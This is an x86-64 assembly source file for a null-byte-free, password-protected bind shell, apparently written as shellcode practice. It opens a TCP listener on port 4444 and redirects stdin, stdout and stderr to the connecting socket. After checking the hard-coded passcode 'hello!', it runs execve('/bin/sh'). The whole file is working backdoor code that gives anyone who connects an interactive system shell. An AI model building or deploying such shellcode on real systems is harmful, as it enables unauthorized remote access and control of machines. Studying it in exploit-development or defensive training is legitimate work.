global _start

section .text


spawnshell:
    ; spawn a shell with execve
    ; Stack method
    ; execve (*pathname, *argv[],*envp[])
    ; pathname = /bin/sh \0
    ; argv = adrr to array of: [addr of /bin/sh \0],0x00]
    ; envp = addr of a null pointer 0x000
    xor rax,rax
    add al,59
    sub rsp, 1
    mov byte [rsp], ah                  ;null byte for string termination
    mov dword [rsp-8], 0x6e69622f       ;1st 4 bytes of /bin/sh in LittleEndian
    mov dword [rsp-4], 0x68732f2f       ;2nd 4 bytes of bin/sh in LE
    sub rsp,8                           ;Fix stack pointer after adding the above
    mov rdi, rsp                        ;1st argument is a pointer to /bin/sh\0 on stack
    xor r9,r9
    push r9                             ;null pointer pushed argv array is terminated by null pointer
    mov rdx,rsp                         ;3rd arg envp to null pointer
    push rdi                            ;push addr of /bin/sh\0
    mov rsi,rsp                         ;set argv argument as pointer to /bin/sh \x00
    syscall                             ;invoke execve(/bin/sh)

_start:

    ;Socket syscall
    xor rax,rax
    xor rdi,rdi
    xor rsi,rsi
    xor rdx,rdx
    add al,41       ;syscall number
    add rdi, 2      ;AF_INET
    inc rsi         ;SOCK_STREAM
    syscall         ;Create Socket fd

    ;Save our socket fd in another register
    mov r15,rax

    ;Bind syscall
    ;1st - Build contents of sockaddr struct in stack:
    mov byte [rsp-16],2             ;AF_INET
    mov word [rsp-14],0x5c11        ;port 4444 in network byte order
    xor r14,r14
    mov dword[rsp-12],r14d          ;INADDR_ANY (0.0.0.0)
    mov qword [rsp-8],r14           ;This is a padding of 0s needed because sockaddr_in gets cast into to sockaddr (which is 16bytes long)
    sub rsp,16                      ;Fix the stack pointer to reflect the above

    xor rax,rax
    add al, 49                      ;syscall number
    mov rdi,r15                     ;socket fd
    mov rsi,rsp                     ;pointer to addr struct
    xor rdx,rdx
    add rdx,16                      ;len of struct addr
    syscall                         ;Bind our socket to sockaddr defined above (0.0.0.0:4444)

    ;Listen syscall
    add al,50                       ;syscall number
    xor rsi,rsi
    inc rsi                         ;Max client connections
    syscall                         ;Listen for incoming connections on the socket fd

    ;Accept syscall
    xor rax,rax
    add al,43                       ;syscall number
    sub rsp,16                      ;leave space in stack of addr struct to be filled in by the kernel
    mov rsi,rsp
    sub rsp,1
    mov byte[rsp],16                ;push len of addr struct to stack
    mov rdx,rsp                     ;pointer to len addr as 3rd argument
    syscall                         ;create new fd from connection on listenning socket

    ; store connected socket in another reg:
    mov r14,rax

    ; Close socket in r15
    xor rax,rax
    add al,3                ; close syscall number
    mov rdi,r15 
    syscall

    ;Duplicate fd
    ;Duplicate stdout,err,in to the new socket
    ;DUP2 syscall

    mov al, 33 ; syscall number
    mov rdi, r14
    xor rsi,rsi             ;stdin
    syscall                 ;Duplicate fd

    xor rax,rax
    mov al, 33
    inc rsi                 ;stdout            
    syscall                 ;Duplicate fd

    xor rax,rax
    mov al, 33
    inc rsi                 ;stderr
    syscall                 ;Duplicate fd

    jmp prompt              ;JMP to: Ask for password

read:
    ;Read from stdin and check passcode
    xor rax,rax                 ;syscall number
    sub rsp,8                   ;length of passcode
    xor rdi,rdi                 ;read from stdin
    mov rsi,rsp                 ;where passcode will be stored
    mov dl,8
    syscall

    ;compare
    xor rax,rax
    mov rdi,rsp
    ; Password I'm looking for is hello! and we'll move it to the stack:
    mov dword[rsp-8],0x6c6c6568  ;lleh
    mov word[rsp-4],0x216f       ;!o
    mov byte[rsp-2],0x0a         ;\n
    mov byte[rsp-1],al           ;0x00
    sub rsp, 8
    mov rax, [rsp]
    scasq
    je spawnshell
    ; Note that there is no need to: jne prompt
    ; because at this point RIP is already pointing to the 1st
    ; instruction inside the "prompt" label

prompt:
    xor rax,rax
    add al,1                    ;Write Syscall
    mov rdi, rax                ;Write to stdout (fd=1)
    xor r9,r9
    push r9                     ;Push \0 end of string to stack
    mov r9, 0x3a3a6b636f6c6e55  
    push r9                     ;Push Prompt Message to stack (in LE)
    lea rsi,[rsp]               ;Pointer to string in stack
    xor rdx,rdx
    mov dl,8                    ;Length of string to print
    syscall                     ;Print to StdOut
    jmp read                    ;JMP to waiting for user input